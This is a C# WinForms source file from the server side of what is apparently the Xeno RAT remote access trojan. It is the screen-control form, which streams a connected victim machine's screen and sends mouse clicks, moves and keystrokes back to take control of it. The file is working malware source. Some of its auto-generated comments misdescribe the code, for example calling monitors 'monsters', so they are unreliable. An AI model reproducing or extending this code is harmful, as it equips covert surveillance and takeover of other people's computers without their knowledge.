using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class ScreenControl : Form
    {
        Node client;
        Node ImageNode;
        bool playing = false;
        int monitor_index = 0;
        double scaling_factor = 1;
        Size? current_mon_size = null;
        string[] qualitys = new string[] { "100%","90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };
        public ScreenControl(Node _client)
        {
            client = _client;
            InitializeComponent();

            client.AddTempOnDisconnect(TempOnDisconnect);
            comboBox2.Items.AddRange(qualitys);
            InitializeAsync();

        }

        /// <summary>
        /// Initializes the object asynchronously by creating an image node, adding temporary on disconnect, refreshing the mons, and receiving thread.
        /// </summary>
        /// <returns>A <see cref="Task"/> representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method initializes the object asynchronously by performing the following tasks:
        /// 1. Creates an image node by awaiting the <see cref="CreateImageNode"/> method.
        /// 2. Adds temporary on disconnect by calling the <see cref="ImageNode.AddTempOnDisconnect"/> method.
        /// 3. Refreshes the mons by awaiting the <see cref="RefreshMons"/> method.
        /// 4. Receives thread by awaiting the <see cref="RecvThread"/> method.
        /// </remarks>
        private async Task InitializeAsync() 
        {
            ImageNode = await CreateImageNode();
            ImageNode.AddTempOnDisconnect(TempOnDisconnect);
            await RefreshMons();
            await RecvThread();
        }

        /// <summary>
        /// Disconnects the client and image node if the provided <paramref name="node"/> is equal to the client or the image node, and closes the form if not disposed.
        /// </summary>
        /// <param name="node">The node to be checked for disconnection.</param>
        /// <exception cref="InvalidOperationException">Thrown when attempting to disconnect the client or image node while they are null.</exception>
        /// <remarks>
        /// If the provided <paramref name="node"/> is equal to the client or the image node, this method disconnects the client and image node if they are not null, and closes the form if it is not disposed.
        /// </remarks>
        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node == ImageNode && ImageNode != null))
            {
                client?.Disconnect();
                ImageNode?.Disconnect();
                if (!this.IsDisposed)
                {
                    this.Invoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }

        /// <summary>
        /// Refreshes the list of monitors in the combo box and enables/disables a button based on the number of monitors.
        /// </summary>
        /// <remarks>
        /// This method asynchronously retrieves the list of monitors and updates the combo box with the new list.
        /// If the list of monitors is empty, the associated button is disabled. Otherwise, the button is enabled and the monitor is set to the first item in the list.
        /// </remarks>
        public async Task RefreshMons() 
        {
            string[] monitors = await GetMonitors();
            comboBox1.Items.Clear();
            comboBox1.Items.AddRange(monitors);
            if (monitors.Length == 0)
            {
                button2.Enabled = false;
            }
            else
            {
                button2.Enabled = true;
                await SetMonitor(0);
            }
        }

        /// <summary>
        /// Starts the asynchronous operation.
        /// </summary>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method initiates an asynchronous operation using the client to send a byte array with a single element of value 0.
        /// </remarks>
        public async Task start() 
        {
            await client.SendAsync(new byte[] { 0 });
        }

        /// <summary>
        /// Sends a stop signal to the client asynchronously.
        /// </summary>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <exception cref="Exception">Thrown when an error occurs while sending the stop signal.</exception>
        public async Task stop()
        {
            await client.SendAsync(new byte[] { 1 });
        }

        /// <summary>
        /// Asynchronously retrieves the list of monitors from the client and returns it as an array of strings.
        /// </summary>
        /// <returns>An array of strings containing the list of monitors.</returns>
        /// <remarks>
        /// This method sends a byte array with a value of 2 to the client asynchronously and then receives a string from the client, which is then split into an array of strings using the newline character as the delimiter.
        /// </remarks>
        public async Task<string[]> GetMonitors()
        {
            await client.SendAsync(new byte[] { 2 });
            string monsString=Encoding.UTF8.GetString(await client.ReceiveAsync());
            string[] mons = monsString.Split('\n');
            return mons;
        }

        /// <summary>
        /// Sets the quality of the client and sends the quality value to the server.
        /// </summary>
        /// <param name="quality">The quality value to be set for the client.</param>
        /// <remarks>
        /// This method sets the quality of the client and sends the quality value to the server using the SendAsync method of the client.
        /// The quality value is sent to the server after concatenating it with a byte array containing the value 3 using the Concat method.
        /// The method is asynchronous and returns a Task representing the asynchronous operation.
        /// </remarks>
        public async Task SetQuality(int quality) 
        {
            await client.SendAsync(client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(quality)));
        }

        /// <summary>
        /// Sets the monitor index and updates the scale size.
        /// </summary>
        /// <param name="monitorIndex">The index of the monitor to be set.</param>
        /// <returns>Task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sets the monitor index to the specified value and updates the scale size accordingly.
        /// It sends the monitor index to the client and receives hardware data, including width and height, from the client.
        /// The received data is used to update the current monitor size, and then the scale size is updated accordingly.
        /// </remarks>
        public async Task SetMonitor(int monitorIndex)
        {
            monitor_index = monitorIndex;
            await client.SendAsync(client.sock.Concat(new byte[] { 4 }, client.sock.IntToBytes(monitorIndex)));
            byte[] hwData = await client.ReceiveAsync();
            int Width = client.sock.BytesToInt(hwData);
            int Height = client.sock.BytesToInt(hwData,4);
            current_mon_size = new Size(Width, Height);
            UpdateScaleSize();
        }

        /// <summary>
        /// Updates the scale size of the picture box based on the current monitor size.
        /// </summary>
        /// <remarks>
        /// This method compares the width and height of the picture box with the current monitor size. If the picture box dimensions exceed the monitor size, it sends a scaling factor of 10000 to the client.
        /// If the picture box dimensions are within the monitor size, it calculates the scaling factor based on the width and height ratios, and sends the scaled factor to the client.
        /// </remarks>
        public async Task UpdateScaleSize() 
        {
            if (pictureBox1.Width > ((Size)current_mon_size).Width || pictureBox1.Height > ((Size)current_mon_size).Height)
            {
                await client.SendAsync(client.sock.Concat(new byte[] { 13 }, client.sock.IntToBytes(10000)));
            }
            else
            {
                double widthRatio = (double)pictureBox1.Width/ (double)((Size)current_mon_size).Width ;
                double heightRatio = (double)pictureBox1.Height / (double)((Size)current_mon_size).Height;
                scaling_factor = Math.Max(widthRatio, heightRatio);
                int factor = (int)(scaling_factor * 10000.0);
                await client.SendAsync(client.sock.Concat(new byte[] { 13 }, client.sock.IntToBytes(factor)));
            }
        }

        /// <summary>
        /// Asynchronously receives data from the ImageNode and updates the PictureBox with the received image.
        /// </summary>
        /// <remarks>
        /// This method continuously receives data from the ImageNode while it is connected. Upon receiving data, it checks if the application is in a playing state. If so, it attempts to convert the received data into a System.Drawing.Image and updates the PictureBox with the new image using BeginInvoke to ensure thread safety. If an exception occurs during the image processing or updating the PictureBox, it is caught and ignored.
        /// </remarks>
        public async Task RecvThread() 
        {
            while (ImageNode.Connected()) 
            {
                byte[] data = await ImageNode.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                if (playing)
                {
                    try
                    {

                        System.Drawing.Image image;
                        using (MemoryStream ms = new MemoryStream(data))
                        {
                            image = System.Drawing.Image.FromStream(ms);
                        }
                        pictureBox1.BeginInvoke(new Action(() =>
                        {
                            if (pictureBox1.Image != null)
                            {
                                pictureBox1.Image.Dispose();
                                pictureBox1.Image = null;
                            }
                            pictureBox1.Image = image;
                        }));
                    }
                    catch { }
                    //update picturebox
                }
            }
        }

        /// <summary>
        /// Creates an image node and returns it. If the image node already exists, returns the existing node.
        /// </summary>
        /// <returns>The created or existing image node.</returns>
        /// <remarks>
        /// This method first checks if the image node already exists. If it does, it returns the existing node.
        /// If the image node does not exist, it creates a new sub-node using the <paramref name="client"/> and sets its type to 2.
        /// It then sends the type 2 ID to the server and waits for a response. If the ID is found, it sets the type 2 ID and returns the sub-node.
        /// If the ID is not found, it disconnects the sub-node and returns null.
        /// If the type 2 ID cannot be set, it disconnects the sub-node and returns null.
        /// </remarks>
        private async Task<Node> CreateImageNode()
        {
            if (ImageNode != null)
            {
                return ImageNode;
            }
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }

        /// <summary>
        /// Translates the original coordinates from one screen size to another based on the target control's image size.
        /// </summary>
        /// <param name="originalCoords">The original coordinates to be translated.</param>
        /// <param name="originalScreenSize">The original screen size.</param>
        /// <param name="targetControl">The target control to which the coordinates will be translated.</param>
        /// <returns>The translated coordinates based on the target control's image size.</returns>
        /// <remarks>
        /// This method calculates the scaling factors based on the target control's image size and the original screen size.
        /// It then applies the scaling factors to the original coordinates to obtain the scaled coordinates.
        /// The method further adjusts the scaled coordinates based on the unzoomed and offset-adjusted coordinates of the target control.
        /// </remarks>
        public Point TranslateCoordinates(Point originalCoords, Size originalScreenSize, PictureBox targetControl)
        {
            // Calculate the scaling factors
            float scaleX = (float)targetControl.Image.Width / originalScreenSize.Width;
            float scaleY = (float)targetControl.Image.Height / originalScreenSize.Height;

            // Apply the scaling factors
            int scaledX = (int)(originalCoords.X * scaleX/ scaling_factor);
            int scaledY = (int)(originalCoords.Y * scaleY/ scaling_factor);

            // Get the unzoomed and offset-adjusted coordinates
            Point translatedCoords = UnzoomedAndAdjusted(targetControl, new Point(scaledX, scaledY));

            return translatedCoords;
        }

        /// <summary>
        /// Translates a point from scaled coordinates to unscaled coordinates and adjusts for the zoom factor.
        /// </summary>
        /// <param name="pictureBox">The PictureBox control used for displaying the image.</param>
        /// <param name="scaledPoint">The point in scaled coordinates to be translated and adjusted.</param>
        /// <returns>The translated and adjusted Point in unscaled coordinates.</returns>
        /// <remarks>
        /// This method calculates the zoom factor based on the size of the PictureBox control and the size of the image being displayed.
        /// It then determines the displayed rectangle of the image within the PictureBox.
        /// The method finally offsets and unzooms the input coordinates to obtain the corresponding unscaled coordinates, taking into account the zoom factor and the displayed rectangle.
        /// </remarks>
        private Point UnzoomedAndAdjusted(PictureBox pictureBox, Point scaledPoint)
        {
            // Calculate the zoom factor
            float zoomFactor = Math.Min(
                (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

            // Get the displayed rectangle of the image
            Rectangle displayedRect = GetImageDisplayRectangle(pictureBox);

            // Offset and unzoom the coordinates
            int translatedX = (int)((scaledPoint.X - displayedRect.X) / zoomFactor);
            int translatedY = (int)((scaledPoint.Y - displayedRect.Y) / zoomFactor);

            return new Point(translatedX, translatedY);
        }

        /// <summary>
        /// Calculates the position on the original image from the zoomed point on the PictureBox.
        /// </summary>
        /// <param name="pictureBox">The PictureBox control where the image is displayed.</param>
        /// <param name="zoomedPoint">The point on the PictureBox after zooming.</param>
        /// <returns>The position on the original image corresponding to the zoomed point.</returns>
        /// <remarks>
        /// This method calculates the position on the original image based on the zoomed point and the scaling factor of the PictureBox.
        /// It first determines the scaling factor by comparing the client size of the PictureBox with the dimensions of the image.
        /// Then, it calculates the bounding rectangle of the displayed image and uses it to find the corresponding position on the original image.
        /// </remarks>
        private Point Unzoomed(PictureBox pictureBox, Point zoomedPoint)
        {
            // Get the scaling factor
            float zoomFactor = Math.Max(
                (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

            // Calculate the bounding rectangle of the displayed image
            Rectangle displayedRect = GetImageDisplayRectangle(pictureBox);

            // Calculate the corresponding position on the image
            int imageX = (int)((zoomedPoint.X - displayedRect.X) / zoomFactor);
            int imageY = (int)((zoomedPoint.Y - displayedRect.Y) / zoomFactor);

            return new Point(imageX, imageY);
        }

        /// <summary>
        /// Gets the display rectangle for the image in the specified PictureBox.
        /// </summary>
        /// <param name="pictureBox">The PictureBox control containing the image.</param>
        /// <returns>
        /// The display rectangle for the image based on the PictureBox's SizeMode property.
        /// If SizeMode is Normal, the rectangle is positioned at (0, 0) with dimensions equal to the image size.
        /// If SizeMode is StretchImage, the rectangle matches the client area of the PictureBox.
        /// If SizeMode is Zoom, the rectangle is calculated to fit the image within the client area while maintaining aspect ratio.
        /// </returns>
        private Rectangle GetImageDisplayRectangle(PictureBox pictureBox)
        {
            if (pictureBox.SizeMode == PictureBoxSizeMode.Normal)
            {
                return new Rectangle(0, 0, pictureBox.Image.Width, pictureBox.Image.Height);
            }
            else if (pictureBox.SizeMode == PictureBoxSizeMode.StretchImage)
            {
                return pictureBox.ClientRectangle;
            }
            else
            {
                float zoomFactor = Math.Min(
                    (float)pictureBox.ClientSize.Width / pictureBox.Image.Width,
                    (float)pictureBox.ClientSize.Height / pictureBox.Image.Height);

                int imageWidth = (int)(pictureBox.Image.Width * zoomFactor);
                int imageHeight = (int)(pictureBox.Image.Height * zoomFactor);

                int imageX = (pictureBox.ClientSize.Width - imageWidth) / 2;
                int imageY = (pictureBox.ClientSize.Height - imageHeight) / 2;

                return new Rectangle(imageX, imageY, imageWidth, imageHeight);
            }
        }

        /// <summary>
        /// Called when the screen control is loaded.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An <see cref="EventArgs"/> that contains the event data.</param>
        private void ScreenControl_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Initiates the start method asynchronously and sets the 'playing' flag to true.
        /// </summary>
        /// <remarks>
        /// This method asynchronously initiates the start method, which may involve asynchronous operations such as network requests or file I/O.
        /// Once the start method is initiated, the 'playing' flag is set to true, indicating that the application is in a playing state.
        /// </remarks>
        private async void button2_Click(object sender, EventArgs e)
        {
            await start();
            playing = true;
        }

        /// <summary>
        /// Stops the current operation and sets the 'playing' flag to false.
        /// </summary>
        /// <remarks>
        /// This method asynchronously stops the current operation and sets the 'playing' flag to false.
        /// </remarks>
        private async void button3_Click(object sender, EventArgs e)
        {
            await stop();
            playing = false;
        }

        /// <summary>
        /// Asynchronously refreshes the monsters.
        /// </summary>
        /// <remarks>
        /// This method triggers an asynchronous refresh of the monsters, updating the monster data and UI display accordingly.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            await RefreshMons();
        }

        /// <summary>
        /// Handles the SelectedIndexChanged event of comboBox1.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method asynchronously sets the monitor based on the selected index in comboBox1.
        /// If the selected index is not -1, it awaits the SetMonitor method passing the selected index as a parameter.
        /// </remarks>
        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetMonitor(selectedIndex);
            }
        }

        /// <summary>
        /// Handles the SelectedIndexChanged event of comboBox2.
        /// Sets the quality based on the selected index in the comboBox.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method retrieves the selected index from comboBox2 and sets the quality based on the selected index.
        /// It first checks if a valid index is selected, then it calls the SetQuality method with the parsed quality value from the qualitys array.
        /// </remarks>
        private async void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox2.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetQuality(int.Parse(qualitys[selectedIndex].Replace("%", "")));
                
            }
        }

        /// <summary>
        /// Handles the mouse click event on pictureBox1 by sending the coordinates and opcode to the server.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the pictureBox1 has an image, if the application is in playing mode, and if checkBox1 is checked. If any of these conditions are not met, the method returns without performing any further actions.
        /// The method then translates the mouse coordinates to match the current monitor size and pictureBox1, and determines the opcode based on the mouse button clicked. The coordinates and opcode are then sent to the server using the client's SendAsync method.
        /// </remarks>
        private async void pictureBox1_MouseClick(object sender, MouseEventArgs e)
        {
            if (pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
            //operation_pass = false
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
            byte opcode = 5;
            if (e.Button == MouseButtons.Right)
            {
                opcode = 9;
            }
            else if (e.Button == MouseButtons.Middle)
            {
                opcode = 10;
            }
            byte[] payload = client.sock.Concat(new byte[] { opcode }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);

        }

        /// <summary>
        /// Handles the double-click event on the picture box.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the current monitor size is null, if the picture box image is null, if the application is not in playing mode, if the right mouse button or middle mouse button is clicked, or if the checkbox is not checked. If any of these conditions are met, the method returns without performing any further actions.
        /// If all conditions are met, the method translates the coordinates of the mouse click to the current monitor size and sends the coordinates to the client asynchronously.
        /// </remarks>
        private async void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (current_mon_size==null|| pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button==MouseButtons.Middle || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 6 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        /// <summary>
        /// Handles the mouse up event for pictureBox1.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the current monitor size and pictureBox1.Image are not null, if the application is in playing state, if the right or middle mouse button is not clicked, and if checkBox1 is checked.
        /// If all conditions are met, it translates the mouse coordinates to the pictureBox1 and sends the payload to the client asynchronously.
        /// </remarks>
        private async void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            //return;
            if (current_mon_size == null || pictureBox1.Image == null || !playing || e.Button==MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 7 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        /// <summary>
        /// Handles the mouse movement event for pictureBox1.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method translates the mouse coordinates to the corresponding coordinates on the pictureBox1 image,
        /// and sends the translated coordinates to the client asynchronously.
        /// </remarks>
        private async void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
            //return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 11 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        /// <summary>
        /// Handles the mouse down event for pictureBox1.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method sends the coordinates of the mouse click to the server using the client's socket connection.
        /// It translates the coordinates relative to the pictureBox1 and sends the payload asynchronously to the server.
        /// </remarks>
        private async void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            //return;
            if (current_mon_size == null || pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
            Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
            byte[] payload = client.sock.Concat(new byte[] { 8 }, client.sock.IntToBytes(coords.X));
            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
            await client.SendAsync(payload);
        }

        /// <summary>
        /// Handles the PreviewKeyDown event for the pictureBox1 control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">A PreviewKeyDownEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the current_mon_size is null, if the pictureBox1.Image is null, if the application is not in a playing state, or if checkBox1 is not checked, and returns if any of these conditions are met.
        /// </remarks>
        private void pictureBox1_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
        {
            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
        }

        /// <summary>
        /// Event handler for the Click event of pictureBox1.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Handles the KeyPress event for the screen control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">A KeyPressEventArgs that contains the event data.</param>
        private void ScreenControl_KeyPress(object sender, KeyPressEventArgs e)
        {
            
        }

        /// <summary>
        /// Handles the KeyDown event for the screen control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">A KeyEventArgs that contains the event data.</param>
        private void ScreenControl_KeyDown(object sender, KeyEventArgs e)
        {

        }

        /// <summary>
        /// Handles the KeyUp event for screen control.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A KeyEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the current monitor size is null, if the picture box image is null, if the application is not playing, or if the checkbox is not checked, and then returns without performing any further action.
        /// If the conditions are met, it sends an asynchronous message to the client with the concatenated byte array consisting of 12 and the key value from the KeyEventArgs.
        /// </remarks>
        private async void ScreenControl_KeyUp(object sender, KeyEventArgs e)
        {
            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
            await client.SendAsync(client.sock.Concat(new byte[] { 12 }, client.sock.IntToBytes(e.KeyValue)));
        }

        /// <summary>
        /// Handles the CheckedChanged event of checkBox1 and updates the text based on the checked state.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method updates the text of checkBox1 based on its checked state. If checkBox1 is checked, the text is set to "Enabled"; otherwise, it is set to "Disabled".
        /// </remarks>
        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "Enabled";
            }
            else 
            {
                checkBox1.Text = "Disabled";
            }
        }

        /// <summary>
        /// Updates the scale size when the size of the picture box changes.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        private void pictureBox1_SizeChanged(object sender, EventArgs e)
        {
            UpdateScaleSize();
        }
    }
}
